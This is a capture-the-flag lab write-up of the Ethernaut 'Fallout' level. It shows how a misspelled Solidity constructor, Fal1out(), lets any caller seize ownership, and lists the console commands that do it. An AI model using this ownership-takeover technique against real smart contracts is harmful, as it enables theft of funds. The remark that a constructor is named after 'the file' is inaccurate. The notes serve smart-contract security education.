------------------
NOTES
------------------
set up URL: https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966
level URL: https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5

LEVEL 2: FALLOUT
------------------

Vulnerability - Bad Code
- This challenge is very simple
- The goal is to change ownership, the only function that changes ownership is
	the "constructor"
-  Vulnerability - a typo
		- /* constructor */
			function Fal1out() public payable {
		- The function Fal1out() has a type and therefore is not acutally a
			constructor, just a normal function
		- Meaning you can call this function at any time and change the owner
		- In Solidity, like java, a constructor is defined when a function has
			the same name as the file, here the two differ and Fal1out() is just
			a funtion

Exploitation
	- Check the current owner
		- await contract.owner()
			'0x0000000000000000000000000000000000000000'
	- Call the "constructor" to update the ownership
		- await contract.Fal1out()
	- Check the new owner
		- await contract.owner()
			'0x681A75F9524b5e015d48DE5B8Fe71D5258328ff8'
	- That's all there is in this challenge, it was simple but helpful to keep
		in mind when "auditing" real smart contracts - as project size increases,
		there is more likely to be small but costly mistakes
